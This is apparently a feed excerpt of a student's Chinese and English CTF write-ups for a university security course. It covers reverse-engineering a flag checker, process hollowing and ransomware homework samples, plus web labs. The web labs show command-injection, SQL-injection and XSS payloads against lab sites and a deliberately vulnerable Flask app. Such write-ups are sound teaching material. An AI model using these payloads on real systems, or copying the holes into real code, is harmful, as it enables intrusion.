&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v3; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v4; &lt;span style="color:#75715e">// edi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r14
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v6; &lt;span style="color:#75715e">// rsi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v8; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%58s&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> flag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (funcs_140001156[v4 &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3u&lt;/span>])(&lt;span style="color:#f92672">&amp;amp;&lt;/span>flag[v5]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v6 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+=&lt;/span> key_140004050[v7];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v4 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( flag[v3] &lt;span style="color:#f92672">==&lt;/span> byte_1400022B8[v3] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">++&lt;/span>v3 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Wrong QAO&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(v8);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x13(Lab - Meow)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</guid><description>&lt;h1 id="simple-reverse-0x13lab---meow">
 Simple Reverse 0x13(Lab - Meow)
 &lt;a class="anchor" href="#simple-reverse-0x13lab---meow">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=7028">課程影片 - Process Injection&lt;/a>
一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種&lt;/p>
&lt;ul>
&lt;li>DLL Injection&lt;/li>
&lt;li>APC Injection&lt;/li>
&lt;li>Early Bird APC Injection&lt;/li>
&lt;li>Process Hollowing&lt;/li>
&lt;li>Reflective DLL Injection&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=10348">破哏教學&lt;/a>
簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了&lt;/p>
&lt;ol>
&lt;li>
&lt;p>先在IDA中找到隱藏的code解密的function
我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function
&lt;img src="https://hackmd.io/_uploads/S1DtpV-K3.png" alt="" />
跟進去後的sub_401550()
&lt;img src="https://hackmd.io/_uploads/Sy3R6Vbth.png" alt="" />
:::spoiler Decrypt Hidden Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">sub_401550&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+Ch] [rbp-4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x3FFF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">+=&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">^=&lt;/span> byte_404020[i &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</guid><description>&lt;h1 id="simple-reverse-0x302023-hw---baby-ransom-1">
 Simple Reverse 0x30(2023 HW - Baby Ransom 1)
 &lt;a class="anchor" href="#simple-reverse-0x302023-hw---baby-ransom-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesw">SetFileAttributesW 函式&lt;/a>
&lt;a href="http://stenwang.blogspot.com/2015/09/schtasks.html">Schtasks 工作排程 &lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-findresourcea">FindResourceA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 StackBase = NtCurrentTeb()-&amp;gt;NtTib.StackBase;
 while ( 1 )
 {
 DestInitValue = _InterlockedCompareExchange64(&amp;amp;qword_140017050, StackBase, 0i64);
 if ( !DestInitValue )
 {
 v5 = 0;
 goto LABEL_7;
 }
 if ( StackBase == DestInitValue )
 break;
 Sleep(1000u);
 }
 v5 = 1;
LABEL_7:
 if ( unk_140017058 == 1 )
 {
 amsg_exit(31i64);
 }
 else if ( unk_140017058 )
 {
 dword_140017008 = 1;
 }
 else
 {
 unk_140017058 = 1;
 initterm(&amp;amp;qword_140019018, qword_140019028);
 }
 if ( unk_140017058 == 1 )
 {
 initterm(&amp;amp;qword_140019000, &amp;amp;qword_140019010);
 unk_140017058 = 2;
 }
 if ( !v5 )
 _InterlockedExchange64(&amp;amp;qword_140017050, 0i64);
 if ( TlsCallback_0 )
 TlsCallback_0(0i64, 2);
 sub_14000226B();
 v6 = 0i64;
 qword_1400170E0 = SetUnhandledExceptionFilter(&amp;amp;loc_140002530);
 (InterlockedExchange64)(nullsub_1);
 InitFloatUnit();
 v7 = dword_140017028;
 space = malloc(8i64 * (dword_140017028 + 1));
 v9 = qword_140017020;
 space_cp = space;
 while ( v7 &amp;gt; v6 )
 {
 size = strlen(*(v9 + 8 * v6)) + 1;
 dest = malloc(size);
 *(space_cp + 8 * v6) = dest;
 src = *(v9 + 8 * v6++);
 qmemcpy(dest, src, size);
 }
 qword_140017020 = space_cp;
 if ( v7 &amp;lt; 0 )
 v7 = 0i64;
 *(space_cp + 8 * v7) = 0i64;
 sub_140001F1E();
 _initenv = qword_140017018;
 dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 =&amp;gt; 0x254CA9C1580
 if ( !dword_14001700C )
 exit(dword_140017010);
 if ( !dword_140017008 )
 cexit();
 return dword_140017010;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA NetworkConfig_1DBB&lt;/p></description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</guid><description>&lt;h1 id="simple-reverse-0x312023-hw---baby-ransom-2">
 Simple Reverse 0x31(2023 HW - Baby Ransom 2)
 &lt;a class="anchor" href="#simple-reverse-0x312023-hw---baby-ransom-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://forum.butian.net/share/2204">SystemFunction033&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA WinMain&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
 HWND hWnd; // [rsp+60h] [rbp-A8h]
 WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
 struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

 memset(&amp;amp;WndClass, 0, sizeof(WndClass));
 WndClass.lpfnWndProc = (WNDPROC)store_winword;
 WndClass.hInstance = hInstance;
 WndClass.lpszClassName = Caption;
 WndClass.hbrBackground = CreateSolidBrush(0);
 if ( !RegisterClassW(&amp;amp;WndClass) )
 return 1;
 hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
 if ( !hWnd )
 return 2;
 MainPayload();
 ShowWindow(hWnd, nShowCmd);
 memset(&amp;amp;Msg, 0, sizeof(Msg));
 while ( GetMessageW(&amp;amp;Msg, 0i64, 0, 0) )
 {
 TranslateMessage(&amp;amp;Msg);
 DispatchMessageW(&amp;amp;Msg);
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA MainPayload&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
 Simple Web - 0x02(Lab - Whois Tool)
 &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://whoistool.ctf.zoolab.org/">https://whoistool.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Almost the same as &lt;a href="https://bernie6401.github.io/7x0Gr0C_QEahfS_QaTLYTg">0x10(Lab - DNS Lookup Tool | WAF)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if(isset($_GET[&amp;#34;host&amp;#34;])){
 $host = $_GET[&amp;#34;host&amp;#34;];
 if(strlen($host) &amp;gt; 15)
 echo &amp;#34;Host name tooooooo logn!!&amp;#34;;
 else
 echo `whois &amp;#34;{$host}&amp;#34; 2&amp;gt;&amp;amp;1;`;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
&lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
 Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
 &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---sqli">
 Exploit - SQLi
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;h3 id="easy-way---sqlmap">
 Easy way - &lt;code>SQLmap&lt;/code>
 &lt;a class="anchor" href="#easy-way---sqlmap">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./sqlmap.py &amp;#34;https://login.ctf.zoolab.org/&amp;#34; --form -dbs sqlite --dump --risk=3 --level=5
...
---
Parameter: username (POST)
 Type: time-based blind
 Title: SQLite &amp;gt; 2.0 AND time-based blind (heavy query)
 Payload: username=&amp;#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||&amp;#39;&amp;amp;password=
---
&lt;/code>&lt;/pre>&lt;h3 id="hard-way---tryerror">
 Hard way - try&amp;amp;error
 &lt;a class="anchor" href="#hard-way---tryerror">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Check if it has &lt;code>sqli&lt;/code> problem
Payload: &lt;code>union'&lt;/code>
&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
 Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
 &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config[&amp;#34;SQLALCHEMY_DATABASE_URI&amp;#34;] = &amp;#34;sqlite:///app.db&amp;#34;
db.init_app(app)

with app.app_context():
 db.session.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS users(
 id Integer PRIMARY KEY,
 username String NOT NULL UNIQUE,
 password String,
 count Integer DEFAULT 0
 );
 &amp;#34;&amp;#34;&amp;#34;)
 db.session.execute(&amp;#34;INSERT OR REPLACE INTO users (username, password) VALUES (&amp;#39;admin&amp;#39;, &amp;#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&amp;#39;)&amp;#34;)
 db.session.commit()

def login(greet):
 if not greet:
 return send_file(&amp;#39;app.py&amp;#39;, mimetype=&amp;#39;text/plain&amp;#39;)
 else:
 return render_template_string(f&amp;#34;Hello {greet}&amp;#34;)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def index():
 if request.method == &amp;#34;GET&amp;#34;:
 return render_template(&amp;#39;index.html&amp;#39;)
 else:
 username = request.form.get(&amp;#39;username&amp;#39;, &amp;#39;&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;, &amp;#39;&amp;#39;)
 error = &amp;#39;&amp;#39;
 user = db.session.execute(&amp;#34;SELECT username, password FROM users where username=:username&amp;#34;, {&amp;#34;username&amp;#34;:username}).first()

 if user and user[1] == password:
 return login(request.form.get(&amp;#39;greet&amp;#39;, &amp;#39;&amp;#39;))
 elif not user:
 error += &amp;#34;User doesn&amp;#39;t exist! &amp;#34;

 # New feature! count login failed event
 db.session.execute(&amp;#34;UPDATE users SET count = count + 1 WHERE username=:username&amp;#34;, {&amp;#34;username&amp;#34;: username})
 db.session.commit()
 count = db.session.execute(f&amp;#34;SELECT * FROM users WHERE username=&amp;#39;{username}&amp;#39;&amp;#34;).first() or [0, 0, 0, 0]
 error += f&amp;#39;Login faild count: {count[3]}&amp;#39;

 return render_template(&amp;#39;index.html&amp;#39;, error=error)


if __name__ == &amp;#34;__main__&amp;#34;:
 app.run(host=&amp;#34;0.0.0.0&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
 Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
 &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://particles.ctf.zoolab.org">https://particles.ctf.zoolab.org&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>The website can change the theme of layout. The main goal is to leak admin&amp;rsquo;s cookie.&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---xss">
 Exploit - XSS
 &lt;a class="anchor" href="#exploit---xss">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use burp suit to check if the website has XSS vulnerability.
&lt;img src="https://i.imgur.com/eu4Qqrs.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Try to modify &lt;code>config&lt;/code> parameter
Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
:::spoiler Response 1&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 url.value = location; config.value = &amp;#39;1;
 alert(123);
 console.log({x://\&amp;#39;; fetch(&amp;#39;/1;alert(123);console.log({x://\.json&amp;#39;).then(r =&amp;gt; r.json()).then(json =&amp;gt; {
 particlesJS(&amp;#34;particles-js&amp;#34;, json)
 })
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>:::
or
Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
 Simple Web - 0x09(Lab - Simple Note)
 &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
